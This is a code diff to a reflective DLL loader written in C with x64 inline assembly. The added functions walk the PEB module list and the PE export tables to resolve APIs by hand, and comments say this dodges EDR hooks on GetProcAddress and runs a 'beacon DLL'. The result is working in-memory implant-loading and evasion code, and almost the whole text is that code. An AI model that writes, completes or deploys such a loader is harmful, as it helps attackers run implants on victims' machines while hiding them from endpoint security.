-				//       DWORD Characteristics;        // 0x0  offset
-				//       DWORD TimeDateStamp;          // 0x4  offset
-				//       WORD MajorVersion;            // 0x8  offset
-				//       WORD MinorVersion;            // 0xA  offset
-				//       DWORD Name;                   // 0xC  offset
-				//       DWORD Base;                   // 0x10 offset
-				//       DWORD NumberOfFunctions;      // 0x14 offset
-				//       DWORD NumberOfNames;          // 0x18 offset
-				//       DWORD AddressOfFunctions;     // 0x1C offset  // ExportAddressTable
-				//       DWORD AddressOfNames;         // 0x20 offset
-				//       DWORD AddressOfNameOrdinals;  // 0x24 offset
-				//     } IMAGE_EXPORT_DIRECTORY,*PIMAGE_EXPORT_DIRECTORY;
-			// get the VA for the array of addresses
-			//importedDllExportAddressTable = ( ImportedDllAddr + ((PIMAGE_EXPORT_DIRECTORY )importedDllExportDirectory)->AddressOfFunctions );
+			// Export Directory for current module/DLL being imported
+			importedDllExportDirectory = getExportDirectory(ImportedDllAddr);
+			// Export Address Table address for the current module being imported
+			importedDllExportAddressTable = getExportAddressTable(ImportedDllAddr, importedDllExportDirectory);
+			// Export AddressOfNames Table address for the current module being imported
+			importedDllExportNameTable = getExportNameTable(ImportedDllAddr, importedDllExportDirectory);
+			// Export AddressOfNameOrdinals Table address for the current module being imported
+			importedDllExportOrdinalTable = getExportOrdinalTable(ImportedDllAddr, importedDllExportDirectory);
 
-			// STEP 2.1 | Export Address Table address for the current module being imported
-			__asm__(
-				"mov rcx, %[importedDllExportDirectory] \n"
-				"mov rdx, %[ImportedDllAddr] \n"
-				"xor rax, rax \n"
-				"add rcx, 0x1C \n"         // DWORD AddressOfFunctions; // 0x1C offset // RCX = &RVAExportAddressTable
-				"mov eax, [rcx] \n"        // RAX = RVAExportAddressTable (Value/RVA)
-				"add rax, rdx \n"          // RAX = VA ExportAddressTable (The address of the Export table in running memory of the process)
-				"mov %[importedDllExportAddressTable], rax \n"
-				:[importedDllExportAddressTable] "=r" (importedDllExportAddressTable)
-				:[importedDllExportDirectory] "r" (importedDllExportDirectory),
-				 [ImportedDllAddr] "r" (ImportedDllAddr)
-			);
-			// STEP 2.2 | Export AddressOfNames Table address for the current module being imported
-			__asm__(
-				"mov rcx, %[importedDllExportDirectory] \n"
-				"mov rdx, %[ImportedDllAddr] \n"
-				"xor rax, rax \n"
-				"add rcx, 0x20 \n"         // DWORD AddressOfFunctions; // 0x20 offset 
-				"mov eax, [rcx] \n"        // RAX = RVAExportAddressOfNames (Value/RVA)
-				"add rax, rdx \n"          // RAX = VA ExportAddressOfNames 
-				"mov %[importedDllExportNameTable], rax \n"
-				:[importedDllExportNameTable] "=r" (importedDllExportNameTable)
-				:[importedDllExportDirectory] "r" (importedDllExportDirectory),
-			 	 [ImportedDllAddr] "r" (ImportedDllAddr)
-			);
-			// STEP 2.3 | Export AddressOfNameOrdinals Table address for the current module being imported
-			__asm__(
-				"mov rcx, %[importedDllExportDirectory] \n"
-				"mov rdx, %[ImportedDllAddr] \n"
-				"xor rax, rax \n"
-				"add rcx, 0x24 \n"         // DWORD AddressOfNameOrdinals; // 0x24 offset 
-				"mov eax, [rcx] \n"        // RAX = RVAExportAddressOfNameOrdinals (Value/RVA)
-				"add rax, rdx \n"          // RAX = VA ExportAddressOfNameOrdinals 
-				"mov %[importedDllExportOrdinalTable], rax \n"
-				:[importedDllExportOrdinalTable] "=r" (importedDllExportOrdinalTable)
-				:[importedDllExportDirectory] "r" (importedDllExportDirectory),
-				 [ImportedDllAddr] "r" (ImportedDllAddr)
-			);
 			if( importLookupTableEntry && ((PIMAGE_THUNK_DATA)importLookupTableEntry)->u1.Ordinal & IMAGE_ORDINAL_FLAG )
 			{
 				// STEP 3 | Export Base Ordinal from the Export Directory of the module/dll being imported (0x10 offset)
@@ -927,7 +508,7 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 					:[importAddressTableEntry] "r" (importAddressTableEntry),  // RAX = The import table entry we are going to overwrite
 					 [importEntryAddressRVA] "r" (importEntryAddressRVA),  // RDX = 00007FFA56740000 &ws2_32.dll
 					 [ImportedDllAddr] "r" (ImportedDllAddr) // RCX = ws2_32.00007FFA5678E500
-              			);
+              	);
 			}
 			else
 			{
@@ -967,12 +548,13 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 					:[importEntryNameStringLength] "=r" (importEntryNameStringLength) 
 					:[importEntryNameString] "r" (importEntryNameString) 
 				);	
-				// use GetProcAddress and patch in the address for this imported function
-				    // typedef struct _IMAGE_IMPORT_BY_NAME {
-					// 	WORD Hint;
-					// 	CHAR Name[1];
-					// } IMAGE_IMPORT_BY_NAME,*PIMAGE_IMPORT_BY_NAME;
-				importEntryAddress = (PVOID)pGetProcAddress( (HMODULE)ImportedDllAddr, (LPCSTR)importEntryNameString );
+				// use GetSymbolAddress to dodge EDR hooks on GetProcAddress() and patch in the address for this imported function
+				importEntryAddress = getSymbolAddress(importEntryNameString, importEntryNameStringLength, ImportedDllAddr, importedDllExportAddressTable, importedDllExportNameTable, importedDllExportOrdinalTable);
+				// If getSymbolAddress() returned a NULL then the symbol is a forwarder string. Use normal GetProcAddress() to handle forwarder
+				if (importEntryAddress == NULL){
+					importEntryAddress = (PVOID)pGetProcAddress( (HMODULE)ImportedDllAddr, (LPCSTR)importEntryNameString );
+				}
+
 				__asm__(
 					"mov rax, %[importAddressTableEntry] \n"
 					"mov rdx, %[importEntryAddress] \n"
@@ -995,7 +577,6 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 				:[importAddressTableEntry] "r" (importAddressTableEntry)
 			);
 		}
-
 		// get the next import
 		// nextModuleImportDescriptor += sizeof( IMAGE_IMPORT_DESCRIPTOR );
 		// nextModuleImportDescriptor += 20;
@@ -1035,23 +616,9 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 
 	// STEP 5: process all of our images relocations...
 	PVOID newRdllNewExeHeaderAddr;
-	__asm__(
-		"mov rax, %[newRdllAddr] \n"
-		"xor rbx, rbx \n"
-		"mov ebx, [rax+0x3C] \n"       // RBX = Offset NewEXEHeader
-		"add rbx, rax \n"              // RBX = &reflectiveDll.dll + Offset NewEXEHeader = &NewEXEHeader
-		"mov %[newRdllNewExeHeaderAddr], rbx \n"  // newRdllNewExeHeaderAddr = ((PIMAGE_DOS_HEADER)newRdllAddr)->e_lfanew
-		:[newRdllNewExeHeaderAddr] "=r" (newRdllNewExeHeaderAddr)
-		:[newRdllAddr] "r" (newRdllAddr)
-	);
 	PVOID newRdllOptionalHeaderAddr;
-	__asm__(
-		"mov rax, %[newRdllNewExeHeaderAddr] \n"
-		"add rax, 0x18 \n"
-		"mov %[newRdllOptionalHeaderAddr], rax \n"
-		:[newRdllOptionalHeaderAddr] "=r" (newRdllOptionalHeaderAddr)
-		:[newRdllNewExeHeaderAddr] "r" (newRdllNewExeHeaderAddr)
-	);
+	newRdllNewExeHeaderAddr = getNewExeHeader(newRdllAddr);
+	newRdllOptionalHeaderAddr = getOptionalHeader(newRdllNewExeHeaderAddr);
 	// calculate the base address delta and perform relocations (even if we load at desired image base)
 	PVOID BaseAddressDelta;
 	//BaseAddressDelta = newRdllAddr - ((PIMAGE_NT_HEADERS)newRdllNewExeHeaderAddr)->OptionalHeader.ImageBase;
@@ -1068,41 +635,6 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 		:[newRdllOptionalHeaderAddr] "r" (newRdllOptionalHeaderAddr),
 		 [newRdllAddr] "r" (newRdllAddr)
 	);
-
-//     typedef struct _IMAGE_OPTIONAL_HEADER {
-//       WORD Magic;
-//       BYTE MajorLinkerVersion;
-//       BYTE MinorLinkerVersion;
-//       DWORD SizeOfCode;
-//       DWORD SizeOfInitializedData;
-//       DWORD SizeOfUninitializedData;
-//       DWORD AddressOfEntryPoint;
-//       DWORD BaseOfCode;
-//       DWORD BaseOfData;
-//       DWORD ImageBase;
-//       DWORD SectionAlignment;
-//       DWORD FileAlignment;
-//       WORD MajorOperatingSystemVersion;
-//       WORD MinorOperatingSystemVersion;
-//       WORD MajorImageVersion;
-//       WORD MinorImageVersion;
-//       WORD MajorSubsystemVersion;
-//       WORD MinorSubsystemVersion;
-//       DWORD Win32VersionValue;
-//       DWORD SizeOfImage;
-//       DWORD SizeOfHeaders;
-//       DWORD CheckSum;
-//       WORD Subsystem;
-//       WORD DllCharacteristics;
-//       DWORD SizeOfStackReserve;
-//       DWORD SizeOfStackCommit;
-//       DWORD SizeOfHeapReserve;
-//       DWORD SizeOfHeapCommit;
-//       DWORD LoaderFlags;
-//       DWORD NumberOfRvaAndSizes;
-//       IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
-//     } IMAGE_OPTIONAL_HEADER32,*PIMAGE_OPTIONAL_HEADER32;
-
 	// newRelocationDirectoryAddr = the address of the base relocation directory from the newRDLL's Optional Header
 	// newRelocationDirectoryAddr = (PVOID)&((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];
 	PVOID newRelocationDirectoryAddr;
@@ -1272,9 +804,7 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 	}
 
 	// STEP 6: call our images entry point
-
 	// the VA of our newly loaded DLL/EXE's entry point
-	
 	PVOID newRdllAddrEntryPoint;
 	//newRdllAddrEntryPoint = ( newRdllAddr + ((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.AddressOfEntryPoint );
 	__asm__(
@@ -1290,34 +820,214 @@ __declspec(dllexport) PVOID WINAPI ReflectiveLoader( VOID )
 		:[OptionalHeaderAddr] "r" (OptionalHeaderAddr),
 		 [newRdllAddr] "r" (newRdllAddr)
 	);
-
-	// We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
-
-	// https://processhacker.sourceforge.io/doc/ntmmapi_8h.html#ae5b613493657596f36f5dd1262ef8fd0
-	// NTSYSCALLAPI NTSTATUS NTAPI NtFlushInstructionCache	(	
-	//	_In_ HANDLE 	ProcessHandle,
-	// _In_opt_ PVOID 	BaseAddress,
-	// _In_ SIZE_T 	Length )
-	// HANDLE -1 is the handle to our current process
+	// Flush instruction cache
 	pNtFlushInstructionCache( (HANDLE)-1, NULL, 0 );
-
-	// call our respective entry point, fudging our hInstance value
+	// Execute beacon DLL
 	((DLLMAIN)newRdllAddrEntryPoint)( (HINSTANCE)newRdllAddr, DLL_PROCESS_ATTACH, NULL );
-
-	// STEP 8: return our new entry point address so whatever called us can call DllMain() if needed.
 	return newRdllAddrEntryPoint;
 }
-BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
+
+// Takes in the 4 first for unicode characters (8 bytes) of a DLL and returns the base address of that DLL module if it is already loaded into memory
+PVOID crawlLdrDllList(wchar_t * dllName)
 {
-    BOOL bReturnValue = TRUE;
-	switch( dwReason ) 
-    { 
-		case DLL_PROCESS_ATTACH:
-			break;
-		case DLL_PROCESS_DETACH:
-		case DLL_THREAD_ATTACH:
-		case DLL_THREAD_DETACH:
-            break;
-    }
-	return bReturnValue;
+	PVOID dllBase;
+	__asm__(
+		"mov r10, %[dllName] \n"
+		"xor rcx, rcx \n"             // RCX = 0x0
+		"mul rcx \n"                  // RAX&RDX =0x0
+	// Check if dllName string is ASCII or Unicode
+		"mov rcx, [r10] \n"           // RCX = First 8 bytes of string 
+		"cmp ch, al \n"               // Unicode then jump, else change ASCII to Unicode 4 bytes
+		"je getMemList \n"
+		"movq mm1, rcx \n"            // MMX1 contains first 8 ASCII Chars
+		"psllq mm1, 0x20 \n"          // Set MMX1 to unpack first 4 bytes of Unicode string
+		"pxor mm2, mm2 \n"            // NULL out MMX2 Register
+		"punpckhbw mm1, mm2 \n"       // convert ASCII to Unicode and save first 4 bytes in MMX1
+		"movq rcx, mm1 \n"            // RCX = first 4 Unicode chars (8bytes)
+	"getMemList:"
+		"mov rbx, gs:[rax+0x60] \n"   // RBX = ProcessEnvironmentBlock // GS = TEB
+		"mov rbx, [rbx+0x18] \n"      // RBX = _PEB_LDR_DATA
+		"mov rbx, [rbx+0x20] \n"      // RBX = InMemoryOrderModuleList - First Entry (probably the host PE File)
+		"mov r11, rbx \n" 
+	"crawl: \n"
+		"mov rax, [rbx+0x50] \n"      // RAX = BaseDllName Buffer - The actual Unicode bytes of the string (we skip the first 8 bytes of the _UNICODE_STRING struct to get the pointer to the buffer)
+		"mov rax, [rax] \n"           // RAX = First 4 Unicode bytes of the DLL string from the Ldr List
+		"cmp rax, rcx \n"
+		"je found \n"
+		"mov rbx, [rbx] \n"           // RBX = InMemoryOrderLinks Next Entry
+		"cmp r11, [rbx] \n"           // Are we back at the same entry in the list?
+		"jne crawl \n"
+		"xor rax, rax \n"
+		"mov %[dllBase], rax \n"      // DLL is not in InMemoryOrderModuleList, return NULL
+		"jmp end \n"
+	"found: \n"
+		"mov %[dllBase], [rbx+0x20] \n" // [rbx+0x20] = DllBase Address in process memory
+	"end: \n"
+		:[dllBase] "=r" (dllBase)
+		:[dllName] "r" (dllName)
+	);
+	return dllBase;
+}
+
+// Takes in the address of a DLL in memory and returns the DLL's Export Directory Address
+PVOID getExportDirectory(PVOID dllBase)
+{
+	PVOID ExportDirectory;
+	__asm__(
+		"mov rcx, %[dllBase] \n"
+		"mov rbx, rcx \n"
+		"mov r8, rcx \n"
+		"mov ebx, [rbx+0x3C] \n"
+		"add rbx, r8 \n"
+		"xor rcx, rcx \n"
+		"add cx, 0x88 \n"
+		"mov edx, [rbx+rcx] \n"
+		"add rdx, r8 \n"
+		"mov %[ExportDirectory], rdx \n"
+		:[ExportDirectory] "=r" (ExportDirectory)
+		:[dllBase] "r" (dllBase)
+	);
+	return ExportDirectory;
+}
+// Return the address of the Export Address Table
+PVOID getExportAddressTable(PVOID dllBase, PVOID ExportDirectory)
+{
+	PVOID ExportAddressTable;
+	__asm__(
+		"mov rcx, %[ExportDirectory] \n"
+		"mov rdx, %[dllBase] \n"
+		"xor rax, rax \n"
+		"add rcx, 0x1C \n"         // DWORD AddressOfFunctions; // 0x1C offset // RCX = &RVAExportAddressTable
+		"mov eax, [rcx] \n"        // RAX = RVAExportAddressTable (Value/RVA)
+		"add rax, rdx \n"          // RAX = VA ExportAddressTable (The address of the Export table in running memory of the process)
+		"mov %[ExportAddressTable], rax \n"
+		:[ExportAddressTable] "=r" (ExportAddressTable)
+		:[ExportDirectory] "r" (ExportDirectory),
+		 [dllBase] "r" (dllBase)
+	);
+	return ExportAddressTable;
+}
+// Return the address of the Export Name Table
+PVOID getExportNameTable(PVOID dllBase, PVOID ExportDirectory)
+{
+	PVOID ExportNameTable;
+	__asm__(
+		"mov rcx, %[ExportDirectory] \n"
+		"mov rdx, %[dllBase] \n"
+		"xor rax, rax \n"
+		"add rcx, 0x20 \n"         // DWORD AddressOfFunctions; // 0x20 offset 
+		"mov eax, [rcx] \n"        // RAX = RVAExportAddressOfNames (Value/RVA)
+		"add rax, rdx \n"          // RAX = VA ExportAddressOfNames 
+		"mov %[ExportNameTable], rax \n"
+		:[ExportNameTable] "=r" (ExportNameTable)
+		:[ExportDirectory] "r" (ExportDirectory),
+		 [dllBase] "r" (dllBase)
+	);
+	return ExportNameTable;
+}
+// Return the address of the Export Ordinal Table
+PVOID getExportOrdinalTable(PVOID dllBase, PVOID ExportDirectory)
+{
+	PVOID ExportOrdinalTable;
+	__asm__(
+		"mov rcx, %[ExportDirectory] \n"
+		"mov rdx, %[dllBase] \n"
+		"xor rax, rax \n"
+		"add rcx, 0x24 \n"         // DWORD AddressOfNameOrdinals; // 0x24 offset 
+		"mov eax, [rcx] \n"        // RAX = RVAExportAddressOfNameOrdinals (Value/RVA)
+		"add rax, rdx \n"          // RAX = VA ExportAddressOfNameOrdinals 
+		"mov %[ExportOrdinalTable], rax \n"
+		:[ExportOrdinalTable] "=r" (ExportOrdinalTable)
+		:[ExportDirectory] "r" (ExportDirectory),
+		 [dllBase] "r" (dllBase)
+	);
+	return ExportOrdinalTable;
+}
+
+//Get the DLL NewExeHeader/NTHeader Address
+PVOID getNewExeHeader(PVOID dllBase)
+{
+	PVOID NewExeHeader;
+	__asm__(
+		"mov rax, %[dllBase] \n"
+		"xor rbx, rbx \n"
+		"mov ebx, [rax+0x3C] \n"           // RBX = Offset NewEXEHeader
+		"add rbx, rax \n"                  // RBX = &module.dll + Offset NewEXEHeader = &NewEXEHeader
+		"mov %[NewExeHeader], rbx \n"  // NewExeHeader = ((PIMAGE_DOS_HEADER)dllBase)->e_lfanew
+		:[NewExeHeader] "=r" (NewExeHeader)
+		:[dllBase] "r" (dllBase)
+	);
+	return NewExeHeader;
+}
+
+// Get the DLL Optional Header Address
+PVOID getOptionalHeader(PVOID NewExeHeader)
+{
+	PVOID OptionalHeader;
+	__asm__(
+		"mov rax, %[NewExeHeader] \n"
+		"add rax, 0x18 \n"
+		"mov %[OptionalHeader], rax \n"
+		:[OptionalHeader] "=r" (OptionalHeader)
+		:[NewExeHeader] "r" (NewExeHeader)
+	);
+	return OptionalHeader;
+}
+
+// Get the DLL Import Directory Address 
+PVOID getImportDirectory(PVOID OptionalHeader)
+{
+	PVOID ImportDirectory;
+	__asm__(
+		"mov rax, %[OptionalHeader] \n"
+		"xor rbx, rbx \n"
+		"mov rbx, 0x78 \n"
+		"add rax, rbx \n"
+		"mov %[ImportDirectory], rax \n"
+		:[ImportDirectory] "=r" (ImportDirectory)
+		:[OptionalHeader] "r" (OptionalHeader)
+	);
+	return ImportDirectory;
+}
+PVOID getSymbolAddress(PVOID symbolString, PVOID symbolStringSize, PVOID dllBase, PVOID ExportAddressTable, PVOID ExportNameTable, PVOID ExportOrdinalTable)
+{
+	PVOID SymbolAddress;
+	__asm__(
+		"mov r11, %[dllBase] \n"
+		"mov rcx, %[symbolStringSize] \n"
+		"mov rdx, %[symbolString] \n"
+		"mov r8, %[ExportAddressTable] \n"
+		"mov r9, %[ExportNameTable] \n"
+		"mov r10, %[ExportOrdinalTable] \n"
+		"push rcx \n"
+		"xor rax, rax \n"
+	"loopFindSymbol: \n"
+		"mov rcx, [rsp] \n"             // RCX/[RSP] = DWORD symbolStringSize (Reset string length counter for each loop)
+		"xor rdi, rdi \n"               // Clear RDI for setting up string name retrieval
+		"mov edi, [r9+rax*4] \n"        // EDI = RVA NameString = [&NamePointerTable + (Counter * 4)]
+		"add rdi, r11 \n"               // RDI = &NameString    = RVA NameString + &module.dll
+		"mov rsi, rdx \n"               // RSI = Address of API Name String to match on the Stack (reset to start of string)
+		"repe cmpsb \n"                 // Compare strings at RDI & RSI
+		"je FoundSymbol \n"             // If match then we found the API string. Now we need to find the Address of the API
+		"inc rax \n"                    // Increment to check if the next name matches
+		"jmp short loopFindSymbol \n"   // Jump back to start of loop
+	"FoundSymbol: \n"
+		"pop rcx \n"                    // Remove string length counter from top of stack
+		"mov ax, [r10+rax*2] \n"        // RAX = [&OrdinalTable + (Counter*2)] = ordinalNumber of module.<API>
+		"mov eax, [r8+rax*4] \n"        // RAX = RVA API = [&AddressTable + API OrdinalNumber]
+		"add rax, r11 \n"               // RAX = module.<API> = RVA module.<API> + module.dll BaseAddress
+		"sub r10, rax \n"               // See if our symbol address is greater than the OrdinalTable Address. If so its a forwarder to a different API
+		"jns isNotForwarder \n"         // If forwarder, result will be negative and Sign Flag is set (SF), jump not sign = jns
+		"xor rax, rax \n"               // If forwarder, return 0x0 and exit
+	"isNotForwarder: \n"
+		"mov %[SymbolAddress], rax \n"  // Save &module.symbol
+		:[SymbolAddress] "=r" (SymbolAddress)
+		:[symbolStringSize]"r"(symbolStringSize),
+		 [symbolString]"r"(symbolString),
+		 [dllBase]"r"(dllBase),
+		 [ExportAddressTable]"r"(ExportAddressTable),
+		 [ExportNameTable]"r"(ExportNameTable),
+		 [ExportOrdinalTable]"r"(ExportOrdinalTable)
+	);
+	return SymbolAddress;
 }
